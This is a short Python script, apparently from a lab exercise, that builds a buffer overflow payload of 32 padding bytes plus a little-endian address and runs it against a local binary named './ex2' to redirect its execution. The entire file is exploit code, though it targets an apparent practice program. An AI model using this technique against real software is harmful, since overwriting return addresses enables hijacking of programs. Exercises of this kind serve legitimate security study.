#!/usr/bin/python3
# wrapper
import os
buff=32*(b'x')
addr=bytearray.fromhex("0100003c64")
addr.reverse()
buff+=addr
print("exec ./ex2 with buff",buff)
os.execv('./ex2',['./ex2',buff])